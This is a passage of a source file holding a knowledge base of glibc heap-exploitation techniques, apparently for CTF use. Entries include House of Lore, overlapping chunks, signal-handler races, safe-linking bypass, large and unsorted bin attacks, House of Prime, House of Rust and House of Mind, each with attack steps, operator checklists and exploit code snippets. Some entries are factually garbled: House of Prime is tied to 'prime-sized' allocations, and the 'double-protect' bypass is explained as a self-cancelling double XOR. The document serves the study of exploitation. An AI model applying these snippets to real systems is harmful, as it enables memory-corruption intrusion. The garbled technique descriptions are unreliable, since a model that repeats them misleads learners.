      { description: 'RELRO Protection and Bypasses' },
    ],
  },

  house_of_lore: {
    id: 'house_of_lore',
    name: 'House of Lore',
    category: 'technique',
    class: 'Heap Exploitation',
    description: 'Corrupts the smallbin free list by manipulating a freed chunk\'s bk pointer, causing malloc to return an arbitrary address. The attacker places a fake chunk at the target location and links it into the smallbin via bk pointer corruption. When malloc services a request from this smallbin, it follows the corrupted bk chain and returns the fake chunk.',
    preconditions: {
      summary: 'Smallbin must have free chunks, and the attacker must be able to corrupt the bk pointer of a freed smallbin chunk. The fake chunk at the target address must have valid size field.',
      required: [
        'Smallbin must have entries (not all in fastbin/tcache)',
        'Ability to corrupt bk pointer of a smallbin chunk',
        'Fake chunk at target address with valid size field',
      ],
      detectionSteps: [
        'Check if target allocation size falls in smallbin range (not fastbin, not tcache)',
        'Use calloc or malloc sizes > 0x80 to avoid fastbin/tcache',
        'In GDB: bins → check smallbin entries',
      ],
    },
    exploitationPaths: [
      {
        name: 'Smallbin bk Corruption → Arbitrary Alloc',
        description: 'Corrupt victim->bk to link a fake chunk into the smallbin, then malloc returns the fake address.',
        steps: [
          'Allocate and free a chunk of smallbin size (>0x80)',
          'Fill tcache for that size to force smallbin usage',
          'Corrupt the freed smallbin chunk\'s bk pointer to &fake_chunk - 0x10',
          'Ensure fake_chunk has valid: fake_chunk->fd = victim, fake_chunk->bk = anything',
          'malloc(smallbin_size) → returns fake_chunk address',
        ],
        tools: ['pwndbg bins', 'pwntools', 'GDB'],
        codeSnippet: `# House of Lore: smallbin bk corruption
# Fill tcache for target size
for i in range(7):
    free(chunks[i])  # fill tcache

# Free victim -> goes to unsorted bin, then smallbin
free(victim)
# Corrupt victim->bk
victim_bk = victim_addr + 8  # offset of bk in malloc_chunk
arb_write(victim_bk, fake_addr - 0x10)  # fake_chunk must be at fake_addr

# Set up fake chunk: fd = victim, bk = don't care
arb_write(fake_addr + 0x10, victim_addr)  # fake->fd = victim
arb_write(fake_addr + 0x18, 0x41414141)  # fake->bk = whatever

# malloc returns fake_addr
ptr = malloc(smallbin_size)  # returns fake_addr!`,
        applicableLibc: 'glibc < 2.29 (easier); 2.29+ has extra smallbin checks',
      },
    ],
    postconditions: {
      successIndicators: ['malloc returns arbitrary address', 'Controlled data at returned pointer'],
      artifacts: ['Fake chunk address', 'Smallbin chunk address', 'Corrupted bk value'],
    },
    operatorChecklist: [
      '[ ] Ensure target size falls in smallbin range',
      '[ ] Fill tcache to force smallbin path',
      '[ ] Corrupt victim->bk to point to fake chunk',
      '[ ] Set fake->fd = victim for glibc 2.29+ check',
      '[ ] malloc the target size to get fake chunk address',
    ],
    vulnerabilityTypes: ['heap-overflow', 'uaf', 'arbitrary-alloc'],
    references: [
      { description: 'House of Lore (how2heap)', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_lore.c' },
    ],
  },

  overlapping_chunks_detailed: {
    id: 'overlapping_chunks_detailed',
    name: 'Overlapping Chunks (Detailed)',
    category: 'technique',
    class: 'Heap Exploitation',
    description: 'Creates two or more heap allocations that point to overlapping memory regions. The attacker corrupts a chunk\'s size field (via overflow, UAF, or tcache poisoning) so that a subsequent malloc returns memory that overlaps with a still-active chunk. This enables read/write through one allocation to modify the other — leading to tcache poisoning, libc leaks, and arbitrary writes.',
    preconditions: {
      summary: 'A heap overflow or UAF allows modifying a chunk\'s size metadata. After corruption, freeing and reallocating creates overlapping regions.',
      required: [
        'Heap overflow to corrupt chunk size field, OR',
        'UAF/double-free to poison tcache/bin lists',
        'Ability to allocate/free chunks before and after corruption',
      ],
      detectionSteps: [
        'Allocate chunks A, B, C adjacent on heap',
        'Overflow A to increase B\'s size field',
        'Free B → now in bin with enlarged size',
        'malloc(B\'s new size) → returns B\'s region overlapping C',
      ],
    },
    exploitationPaths: [
      {
        name: 'Size Corruption → Overlapping Allocation',
        description: 'Overwrite a chunk\'s size to make it larger, then reallocate to overlap with adjacent chunks.',
        steps: [
          'Allocate victim and adjacent chunks',
          'Overflow into adjacent chunk size field (increase it)',
          'Free the corrupted chunk → placed in larger size bin',
          'malloc(corrupted_size) → returns chunk overlapping victim\'s data',
          'Read/write through overlapping chunk modifies victim\'s fields',
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `# Overlapping chunks via size corruption
A = malloc(0x18)  # chunk of size 0x20
B = malloc(0x18)  # chunk of size 0x20
C = malloc(0x418) # large chunk

# Overflow A into B's size field
overflow_write(A + 0x18 + 8, 0x441)  # B->size = 0x440 (encompasses C)

# Free B → goes to unsorted bin as size 0x440
free(B)

# Reallocate → overlaps C
D = malloc(0x430)  # D overlaps C's data!
# Any write to D offsets >= 0x20 modifies C's content`,
        applicableLibc: 'All (size corruption is fundamental)',
      },
    ],
    postconditions: {
      successIndicators: ['Two active pointers point to overlapping memory', 'Data written through one pointer is visible through the other'],
      artifacts: ['Overlapping chunk addresses', 'Size corruption offset'],
    },
    operatorChecklist: [
      '[ ] Allocate victim and adjacent chunks',
      '[ ] Corrupt adjacent chunk size field',
      '[ ] Verify next chunk prev_size matches (for free)',
      '[ ] Free corrupted chunk → re-allocate overlapping size',
      '[ ] Confirm overlap: write to new alloc, read from old',
    ],
    vulnerabilityTypes: ['heap-overflow', 'uaf', 'overlapping'],
    references: [
      { description: 'Overlapping Chunks (how2heap)', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/overlapping_chunks.c' },
    ],
  },

  signal_handler_exploit_kb: {
    id: 'signal_handler_exploit',
    name: 'Signal Handler Exploitation',
    category: 'technique',
    class: 'Async Exploitation',
    description: 'Abusing signal handlers (SIGALRM, SIGSEGV, etc.) that execute user-controllable code in an asynchronous context. CTF challenges often use alarm() to set a timeout, with a handler that either leaks data (info disclosure) or calls vulnerable functions. The async nature introduces race conditions and re-entrancy issues that can be exploited for UAF or double-fetch attacks.',
    preconditions: {
      summary: 'Binary installs a signal handler via signal() or sigaction(). The handler accesses global/heap data that the attacker can influence between the signal delivery and handler execution.',
      required: [
        'Signal handler installed (signal()/sigaction())',
        'Handler accesses shared/global data',
        'Attacker can influence the data between signal setup and handler execution',
      ],
      detectionSteps: [
        'ltrace ./binary | grep signal → find signal() calls',
        'In Ghidra: search for signal/sigaction calls',
        'Check if alarm(N) is used (SIGALRM handler)',
        'Identify what the handler does: print data? free memory? write?',
      ],
    },
    exploitationPaths: [
      {
        name: 'SIGALRM Info Leak',
        description: 'The alarm handler prints memory content (e.g., stack, heap) — use to leak canary, libc, or heap addresses.',
        steps: [
          'Set alarm() before buffer overflow',
          'Signal fires → handler prints memory content',
          'Parse leaked values from output',
          'Use leaks to build final exploit payload',
        ],
        tools: ['ltrace', 'strace', 'GDB', 'pwntools'],
        codeSnippet: `# SIGALRM handler leaks data
from pwn import *
p = process('./binary')

# Handler prints canary or libc address after alarm
leak = p.recvline()  # handler output
canary = int(leak.strip(), 16)

# Now build overflow with leaked canary
payload = b'A' * offset + p64(canary) + p64(0) + p64(ret) + p64(system)`,
        applicableLibc: 'All',
      },
      {
        name: 'Signal Handler UAF / Race Condition',
        description: 'The handler frees or modifies data that is still being used, creating a UAF or double-fetch window.',
        steps: [
          'Send input that starts a long operation',
          'SIGALRM fires mid-operation, handler frees global buffer',
          'Reallocate freed buffer with controlled data',
          'Original operation continues with dangling pointer → UAF',
        ],
        tools: ['pwntools', 'GDB', 'pwndbg'],
        codeSnippet: `# Race condition via signal handler
from pwn import *

p = process('./binary')
# Binary does: signal(SIGALRM, handler); alarm(1); gets(buf);
# Handler does: free(global_ptr); global_ptr = NULL;

# Thread 1: trigger the operation
p.sendline(b'A' * offset)  # starts long operation

# Signal fires after 1 second:
# handler frees global_ptr → UAF window opens

# Thread 2/next request: allocate controlled data
p.sendline(b'B' * size)  # fills freed slot with our data

# Original operation uses dangling pointer with our data`,
        applicableLibc: 'All (race condition dependent)',
      },
    ],
    postconditions: {
      successIndicators: ['Signal handler leaks memory addresses', 'Race condition achieved: UAF or double-fetch confirmed'],
      artifacts: ['Leaked addresses from handler', 'Signal handler function address'],
    },
    operatorChecklist: [
      '[ ] Identify signal handlers with ltrace/strace',
      '[ ] Determine what data handler accesses',
      '[ ] Check if handler leaks, frees, or modifies shared data',
      '[ ] If leak: parse leaked values and build exploit',
      '[ ] If UAF: exploit the race window between signal and return',
    ],
vulnerabilityTypes: ['signal-handler', 'race-condition', 'info-leak', 'uaf'],
    references: [
      { description: 'Signal Handler Exploitation in CTF' },
    ],
  },

  safe_linking_bypass: {
    id: 'safe_linking_bypass',
    name: 'Safe-Linking Bypass (Prerequisite)',
    category: 'technique',
    class: 'heap-prerequisite',
    description: 'Pre-requisite bypass for modern heap exploitation. Glibc 2.32+ introduced safe-linking which XORs fd pointers with (chunk_addr >> 12). This technique documents the various ways to bypass or work around this protection as a prerequisite for tcache/fastbin exploitation.',
    preconditions: {
      summary: 'Understanding of safe-linking and ability to either decrypt existing pointers or bypass the protection entirely.',
      required: [
        'Glibc >= 2.32 (safe-linking era)',
        'Either: heap leak to decrypt existing pointers',
        'Or: ability to write fd twice (double-protect bypass)',
        'Understanding of XOR mechanics for pointer corruption'
      ],
      detectionSteps: [
        'Check glibc version: ldd --version',
        'Identify if safe-linking is present (heap layout shows XORed pointers)',
        'For decryption: leak poisoned fd + chunk address',
        'For bypass: write fd twice with different XOR values'
      ]
    },
    exploitationPaths: [
      {
        name: 'Decrypt Existing Safe-Linked Pointers',
        description: 'Recover actual fd pointers from poisoned values using heap leak.',
        steps: [
          'Leak poisoned fd pointer: shows XORed value',
          'Leak or calculate chunk address: chunk_addr',
          'Decrypt: actual_fd = poisoned_fd ^ (chunk_addr >> 12)',
          'Use decrypted fd to understand heap layout',
          'For corruption: encrypt target = target_addr ^ (chunk_addr >> 12)'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Decrypt safe-linking
poisoned_fd = leak_from_heap(chunk + 0x10)
chunk_addr = calculate_from_leak()
actual_fd = poisoned_fd ^ (chunk_addr >> 12)

# Corrupt: encrypt target
target_enc = target_addr ^ (chunk_addr >> 12)
*(uint64_t*)(chunk + 0x10) = target_enc`,
        applicableLibc: '>= 2.32'
      },
      {
        name: 'Double-Protect Bypass (Leakless)',
        description: 'Bypass safe-linking by writing the fd pointer twice with different XOR values, canceling out the protection.',
        steps: [
          'First write: fd = target1 ^ (chunk_addr >> 12)',
          'Second write: fd = (target1 ^ (chunk_addr >> 12)) ^ (chunk_addr >> 12)',
          'Result: fd = target1 after double XOR',
          'The second write uses the already-XORed value as input',
          'Effectively bypasses safe-linking without any leak'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Double-protect bypass
# First write: XOR with chunk_addr >> 12
*(uint64_t*)(chunk + 0x10) = target1 ^ (chunk_addr >> 12)

# Second write: XOR the already-XORed value again
# Result after second XOR: (target1 ^ x) ^ x = target1
*(uint64_t*)(chunk + 0x10) = (target1 ^ (chunk_addr >> 12)) ^ (chunk_addr >> 12)`,
        applicableLibc: '>= 2.32',
        references: [
          { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' }
        ]
      }
    ],
    postconditions: {
      successIndicators: ['Safe-linking XOR understood and bypassed', 'Pointers can be corrupted without leaking actual addresses'],
      artifacts: ['GDB: corrupted fd leads to arbitrary allocation']
    },
    operatorChecklist: [
      '[ ] Identify glibc version (2.32+ has safe-linking)',
      '[ ] For decryption: leak both poisoned fd AND chunk address',
      '[ ] Calculate: actual = poisoned ^ (addr >> 12)',
      '[ ] For double-protect: write fd twice with sequential XORs',
      '[ ] Verify pointer corruption achieves desired tcache/fastbin manipulation'
    ],
    vulnerabilityTypes: ['heap', 'tcache', 'fastbin', 'safe-linking', 'prerequisite'],
    references: [
      { description: 'Safe-linking paper', url: 'https://research.ptsecurity.com/understanding-glibc-heap-implementation' },
      { description: 'How2Heap: decrypt_safe_linking', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c' }
    ]
  },

  large_bin_attack_modern: {
    id: 'large_bin_attack_modern',
    name: 'Large Bin Attack (Modern - glibc 2.30+)',
    category: 'technique',
    class: 'heap-primitive',
    description: 'Standalone arbitrary write primitive via large bin corruption. Modern glibc 2.30+ revised the large bin handling but the attack remains effective. By corrupting fd_nextsize/bk_nextsize of a large bin chunk, an arbitrary 64-bit value can be written to a target address during the unlink operation.',
    preconditions: {
      summary: 'A heap overflow or UAF allowing corruption of a large bin chunk\'s metadata. Requires ability to allocate large chunks (>= 0x400) and trigger malloc to consolidate.',
      required: [
        'Heap overflow or UAF to corrupt large bin chunk',
        'Ability to place chunk in large bin (size >= 0x400)',
        'Target address must have a valid pointer for fd check',
        'Glibc 2.30+ (revised but still vulnerable)'
      ],
      detectionSteps: [
        'Allocate chunks A (large), B (large), C (guard)',
        'Free A and B to large bin',
        'Corrupt B\'s fd_nextsize/bk_nextsize to point to target-0x20/target-0x10',
        'Allocate from large bin to trigger unlink',
        'Arbitrary write occurs at target address'
      ]
    },
    exploitationPaths: [
      {
        name: 'Large Bin -> Arbitrary Write via Unlink',
        description: 'Corrupt large bin chunk pointers to write arbitrary value during unlink.',
        steps: [
          'Allocate A (large, >= 0x400) and B (same size)',
          'Free A to large bin',
          'Corrupt B\'s fd_nextsize = target - 0x20',
          'Corrupt B\'s bk_nextsize = target - 0x10',
          'Free another chunk to trigger consolidation or malloc to process large bin',
          'Unlink of B writes &B to target-0x20 (via fd_nextsize)',
          'Unlink writes &B to target-0x10 (via bk_nextsize) = arbitrary write'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Large bin attack setup
a = malloc(0x500)  # large chunk A
b = malloc(0x500)  # large chunk B
c = malloc(0x100)  # guard

free(a)  # A into large bin

# Corrupt B's nextsize pointers
# Target: _IO_list_all - 0x20 (common target for FSOP)
*(uint64_t*)(b + 0x20) = target_addr - 0x20  # fd_nextsize
*(uint64_t*)(b + 0x28) = target_addr - 0x10  # bk_nextsize

# Ensure target has valid fd for integrity check
*(uint64_t*)(target_addr - 0x20) = valid_heap_addr  # pass the checks

# Trigger unlink from large bin
malloc(0x500)  # unlink B → write &B to target_addr`,
        applicableLibc: '>= 2.30 (still vulnerable after 2.29 patches)',
        references: [
          { description: 'How2Heap: large_bin_attack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c' }
        ]
      }
    ],
    postconditions: {
      successIndicators: ['Large bin unlink writes heap pointer to arbitrary address', 'Can be chained with FSOP or other techniques'],
      artifacts: ['GDB: large bin with corrupted nextsize pointers']
    },
    operatorChecklist: [
      '[ ] Allocate large chunks (>= 0x400) for large bin',
      '[ ] Free first chunk to populate large bin',
      '[ ] Corrupt second chunk\'s fd_nextsize/bk_nextsize',
      '[ ] Place valid pointer at target-0x20 for integrity check',
      '[ ] Trigger malloc to process large bin and unlink corrupted chunk'
    ],
    vulnerabilityTypes: ['heap', 'large-bin', 'arbitrary-write'],
    references: [
      { description: 'Large bin attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/large_bin_attack/' }
    ]
  },

  unsorted_bin_attack_classic: {
    id: 'unsorted_bin_attack_classic',
    name: 'Unsorted Bin Attack (Classic - pre-2.29)',
    category: 'technique',
    class: 'heap-primitive',
    description: 'Classic arbitrary write via unsorted bin corruption. Pre-glibc 2.29, the unsorted bin unlink did not check bk->fd == victim, allowing arbitrary write of the bin\'s head pointer to a target address. Mostly patched in modern glibc but appears in CTF challenges with older binaries.',
    preconditions: {
      summary: 'A freed chunk in the unsorted bin with ability to corrupt its bk pointer. Requires libc leak for modern versions, but in pre-2.29 the attack itself provides information leak.',
      required: [
        'Freed chunk sitting in unsorted bin',
        'Overflow or UAF to corrupt bk pointer',
        'Target address must be writable',
        'For pre-2.29: no integrity check on bk->fd'
      ],
      detectionSteps: [
        'Allocate and free chunk to unsorted bin',
        'Corrupt chunk->bk = target_addr - 0x10',
        'Allocate same size to trigger unlink',
        'bk pointer written to target_addr'
      ]
    },
    exploitationPaths: [
      {
        name: 'Unsorted Bin -> Write bk to Target',
        description: 'Classic unsorted bin attack writes bin head pointer to arbitrary location.',
        steps: [
          'malloc chunk and free to unsorted bin',
          'Corrupt chunk->bk = target - 0x10',
          'For modern glibc: ensure target-0x10 has valid fd pointer',
          'malloc(size) triggers unlink',
          'victim->bk->fd = victim results in write to target-0x10+0x18 = target'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Unsorted bin attack
a = malloc(0x80)
free(a)  # a goes to unsorted bin

# Corrupt bk pointer
*(uint64_t*)(a + 0x18) = target_addr - 0x10

# For glibc < 2.29: unlink writes &a to target
# For >= 2.29: need valid pointer at target-0x10
*(uint64_t*)(target_addr - 0x10) = 0  # or any valid pointer

malloc(0x80)  # trigger unlink → write to target_addr`,
        applicableLibc: 'Pre-2.29 (classic), >= 2.29 with additional constraints',
        references: [
          { description: 'Unsorted Bin Attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/' }
        ]
      }
    ],
    postconditions: {
      successIndicators: ['Unsorted bin unlink writes to target address', 'Often used to overwrite _IO_list_all for FSOP'],
      artifacts: ['GDB: corrupted bk pointer in unsorted bin chunk']
    },
    operatorChecklist: [
      '[ ] Get chunk into unsorted bin via malloc + free',
      '[ ] Corrupt chunk->bk to point to target-0x10',
      '[ ] For modern glibc: place valid fd at target-0x10',
      '[ ] Trigger malloc to unlink from unsorted bin'
    ],
    vulnerabilityTypes: ['heap', 'unsorted-bin', 'arbitrary-write', 'legacy'],
    references: [
      { description: 'Understanding glibc heap', url: 'https://research.ptsecurity.com/understanding-glibc-heap-implementation' }
    ]
  },

  house_of_prime: {
    id: 'house_of_prime',
    name: 'House of Prime',
    category: 'technique',
    class: 'house',
    description: 'Variant of unsorted bin attack that targets the free list manipulation. House of Prime relies on specific malloc behavior with prime-sized allocations to trigger unusual free list operations that can be exploited for arbitrary write.',
    preconditions: {
      summary: 'Ability to allocate prime-sized chunks and trigger specific free patterns that interact with the unsorted bin in unusual ways.',
      required: [
        'Ability to allocate chunks of specific sizes (often prime numbers)',
        'Understanding of how prime sizes affect bin indexing',
        'Control over malloc/free patterns to trigger unusual behavior'
      ],
      detectionSteps: [
        'Identify prime-sized allocations in binary',
        'Observe how free handles these chunks',
        'Look for non-standard bin behavior with prime sizes'
      ]
    },
    exploitationPaths: [
      {
        name: 'Prime-Size Chunk -> Unsorted Bin Exploitation',
        description: 'Use prime-sized allocations to manipulate bin behavior.',
        steps: [
          'Allocate prime-sized chunk(s)',
          'Trigger specific free pattern that exposes bin manipulation',
          'Corrupt bin metadata to achieve write primitive'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# House of Prime concept
# Allocate prime-sized chunks to manipulate bin behavior
# The specific exploitation depends on bin index calculation
# with prime-sized allocations

p = malloc(0x3d)  # example prime size
free(p)  # unusual bin behavior may be triggered`,
        applicableLibc: 'Varies by prime size handling',
        references: [
          { description: 'How2Heap: house_of_prime', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_prime.c' }
        ]
      }
    ],
    vulnerabilityTypes: ['heap', 'house', 'bin-manipulation'],
    references: [
      { description: 'House of Prime original writeup' }
    ]
  },

  house_of_rust: {
    id: 'house_of_rust',
    name: 'House of Rust (Modern glibc 2.34+)',
    category: 'technique',
    class: 'house',
    description: 'Modern heap exploitation technique for glibc 2.34+ where traditional hooks (__free_hook, __malloc_hook) are removed. Exploits tcache metadata manipulation and thread-local storage structures to achieve code execution. Still niche and evolving technique.',
    preconditions: {
      summary: 'Modern glibc 2.34+ with hooks removed. Requires deeper understanding of allocator internals and alternative targets.',
      required: [
        'Glibc >= 2.34 (hooks removed)',
        'Heap overflow or UAF reaching tcache metadata',
        'Understanding of thread-local structures as targets',
        'Alternative execution redirection (not via hooks)'
      ],
      detectionSteps: [
        'Verify glibc 2.34+ in use',
        'Identify tcache_perthread_struct location',
        'Explore alternative targets: exit handlers, thread-local, vtables'
      ]
    },
    exploitationPaths: [
      {
        name: 'Tcache Metadata -> Thread-Local Corrupt',
        description: 'Corrupt tcache metadata to redirect execution through thread-local structures.',
        steps: [
          'Locate tcache_perthread_struct',
          'Identify thread-local destructor list or similar',
          'Corrupt entries to point to controlled memory',
          'Trigger deallocation to redirect execution'
        ],
        tools: ['pwndbg heap', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Rust: tcache metadata manipulation
# Modern glibc 2.34+ doesn't have __free_hook

# Option: corrupt tcache entries to point to thread-local
tcache_struct = heap_base + 0x10

# Overwrite entry for target size
# Point to our controlled memory with gadget address
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = controlled_addr

# Place one_gadget or ROP chain at controlled_addr
# Trigger will follow pointer during tcache processing`,
        applicableLibc: '>= 2.34',
        references: [
          { description: 'House of Rust research', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_rust.c' }
        ]
      }
    ],
    postconditions: {
      successIndicators: ['Execution redirected via thread-local or tcache structures'],
      artifacts: ['GDB: corrupted tcache metadata']
    },
    operatorChecklist: [
      '[ ] Verify glibc 2.34+ (hooks removed)',
      '[ ] Identify alternative target (thread-local, exit hooks)',
      '[ ] Corrupt tcache metadata to point to target',
      '[ ] Place gadget/ROP at controlled address',
      '[ ] Trigger deallocation'
    ],
    vulnerabilityTypes: ['heap', 'tcache', 'modern-glibc', 'leakless'],
    references: [
      { description: 'How2Heap: house_of_rust', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_rust.c' }
    ]
  },

  house_of_mind_original: {
    id: 'house_of_mind_original',
    name: 'House of Mind (Original - Non-Main Arena)',
    category: 'technique',
    class: 'house',
    description: 'Original House of Mind variant that exploits non-main arena thread cache behavior. Different from the fastbin variant - targets thread arenas and uses narrow address proof manipulation to trick malloc into treating arbitrary memory regions as heap chunks. Exploits the fact that thread arenas use mmap rather than brk for large allocations.',
    preconditions: {
      summary: 'Understanding of thread arena behavior and ability to control allocation sizes that trigger mmap instead of brk.',
      required: [
        'Ability to allocate chunks large enough for mmap (>= 0x20000)',
        'Understanding of thread arena vs main arena behavior',
        'Ability to manipulate chunk size to pass arena checks'
      ],
      detectionSteps: [
        'Identify thread arena usage (multiple threads)',
        'Allocate mmap-sized chunks',
        'Observe arena assignment behavior',
        'Corrupt arena pointers to trick malloc'
      ]
    },
    exploitationPaths: [
      {
        name: 'Thread Arena -> Fake Chunk via Mmap',
        description: 'Use mmap behavior in thread arenas to create fake chunks.',
        steps: [
          'Allocate mmap-sized chunks to enter thread arena',
          'Corrupt chunk metadata for arena pointer manipulation',
          'Trigger malloc to process fake chunk in manipulated arena',
          'Unlink/write primitives activated'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# House of Mind (Original): thread arena exploitation
# Thread arenas use mmap for large allocations
# This enables different chunk manipulation

# Allocate large chunk to enter thread arena
p = malloc(0x20000)  # triggers mmap → thread arena

# For thread arenas, chunk metadata includes arena pointer
# Corrupt to point to fake arena or manipulated region
*(uint64_t*)(p + arena_offset) = fake_arena_addr

# Continue with unlink/write primitives`,
        applicableLibc: '2.23-2.27 (before tcache stashing changes)',
        references: [
          { description: 'House of Mind original writeup' }
        ]
      }
    ],
    postconditions: {
      successIndicators: ['Chunk processed in manipulated thread arena'],
      artifacts: ['GDB: thread arena with corrupted pointers']
    },
    operatorChecklist: [
      '[ ] Identify thread arena usage in binary',
      '[ ] Allocate mmap-sized chunks to enter thread arena',
      '[ ] Corrupt arena pointers in chunk metadata',
      '[ ] Trigger malloc to process in manipulated arena'
    ],
    vulnerabilityTypes: ['heap', 'house', 'thread-arena'],
    references: [
      { description: 'Heap Exploitation: House of Mind' }
    ]
  }
};

export const TECHNIQUES_LIST = Object.values(PWN_KNOWLEDGE_BASE);
